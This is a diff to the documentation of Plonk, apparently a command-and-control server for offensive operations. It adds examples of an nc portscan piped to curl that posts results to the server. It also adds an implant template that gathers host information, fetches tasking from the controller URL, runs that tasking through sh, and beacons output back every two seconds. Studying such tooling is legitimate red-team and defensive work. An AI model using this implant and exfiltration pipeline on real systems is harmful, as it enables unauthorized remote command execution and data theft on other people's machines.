@@ -57,7 +57,14 @@ printed to any user which has that ID selected with `,seti`.  By default, only
 1MB of output will be accepted.  Larger amounts of data may be sent via
 [`/p`](#exfil-p).
 
-### Example
+It's not necessary to have a [`/c`-generated](#implant-generation-c) implant
+running.  Anything may be sent to `/o` with any ID, using Plonk as a sort of
+generic logger.  Don't forget to `,seti <ID>` before sending output to see it
+in real-time.  It will still be logged, `,seti` or not, of course.
+
+### Examples
+Grab some tasking, using the ID `kittens`.
+
 #### Implant:
 ```sh
 curl -s https://example.com/t/kittens | 
@@ -75,6 +82,57 @@ root     30130  0.0  0.0  1112    24 ??  Ip     Sat01AM    0:00.00 - /sbin/slaac
 _slaacd  83001  0.0  0.0  1108    24 ??  Ip     Sat01AM    0:00.00 |-- slaacd: engine (slaacd)
 _slaacd  55365  0.0  0.0  1128    24 ??  IpU    Sat01AM    0:00.00 `-- slaacd: frontend (slaacd)
 ...
+```
+
+#### On Target:
+Send cheesy portscanner output to Plonk using OpenBSD's
+[`nc(1)`](https://man.openbsd.org/nc.1) as open ports are found:
+```sh
+nc -zw1 100.100.100.2 1-65535 2>&1 | # Hope you get RSTs back...
+while read -r l; do
+        echo "$l" | curl --data-binary @- http://127.0.0.1:8080/o/portscan
+done &
+```
+
+#### Client:
+```
+(plonk)> ,seti portscan
+2024/01/17 20:41:26 Interacting with portscan
+2024/01/17 20:41:26 Use ,logs to return to watching Plonk's logs
+2024/01/17 20:41:50 [OUTPUT] From portscan
+Connection to 100.100.100.2 21 port [tcp/ftp] succeeded!
+2024/01/17 20:41:50 [OUTPUT] From portscan
+Connection to 100.100.100.2 22 port [tcp/ssh] succeeded!
+2024/01/17 20:41:50 [OUTPUT] From portscan
+Connection to 100.100.100.2 23 port [tcp/telnet] succeeded!
+```
+
+This is logged as
+```json
+{"time":"2024-01-17T20:43:03.210942091+01:00","level":"INFO","msg":"Output",
+ "output":"Connection to 100.100.100.2 21 port [tcp/ftp] succeeded!",
+ "id":"portscan","host":"127.0.0.1:8080","method":"POST",
+ "remote_address":"127.0.0.1:47501","url":"/o/portscan"}
+{"time":"2024-01-17T20:43:03.233814119+01:00","level":"INFO","msg":"Output",
+ "output":"Connection to 100.100.100.2 22 port [tcp/ssh] succeeded!",
+ "id":"portscan","host":"127.0.0.1:8080","method":"POST",
+ "remote_address":"127.0.0.1:27598","url":"/o/portscan"}
+{"time":"2024-01-17T20:43:03.257795851+01:00","level":"INFO","msg":"Output",
+ "output":"Connection to 100.100.100.2 23 port [tcp/telnet] succeeded!",
+ "id":"portscan","host":"127.0.0.1:8080","method":"POST",
+ "remote_address":"127.0.0.1:12273","url":"/o/portscan"}
+```
+which is probably a bit easier to read with 
+[`jq`](https://jqlang.github.io/jq/):
+```
+$ tail -f log.json |
+  jq -r 'select("Output" == .msg and "portscan" == .id) | .output'
+Connection to 100.100.100.2 21 port [tcp/ftp] succeeded!
+Connection to 100.100.100.2 22 port [tcp/ssh] succeeded!
+Connection to 100.100.100.2 23 port [tcp/telnet] succeeded!
+Connection to 100.100.100.2 21 port [tcp/ftp] succeeded!
+Connection to 100.100.100.2 22 port [tcp/ssh] succeeded!
+Connection to 100.100.100.2 23 port [tcp/telnet] succeeded!
 ```
 
 Static Files (`/f`)
@@ -129,6 +187,20 @@ type TemplateParams struct {
 ```
 If there is no `implant.tmpl`, the built-in
 [`curlgen.tmpl`](../internal/server/implantsvr/curlgen.tmpl) is used.
+
+#### Example
+This template runs a few commands for situational awareness then beacons back
+to Plonk every two seconds for an hour.
+```sh
+export PLONK_ID="{{ .RandN }}-$(hostname)-$$"
+(
+        echo 'ps awwwfux || ps auxwww; uname -a; id; pwd'
+        curl -sw '\n' --rate 30/m "{{ .URL }}/t/$PLONK_ID?n=[0-1800]"
+        PLONK_DONE=!$PLONK_DONE
+) | sh | while ! $PLONK_DONE; do
+        timeout 2s cat | curl -T. -s -m 10 "{{ .URL }}/o/$PLONK_ID"
+done
+```
 
 Exfil (`/p`)
 ------------
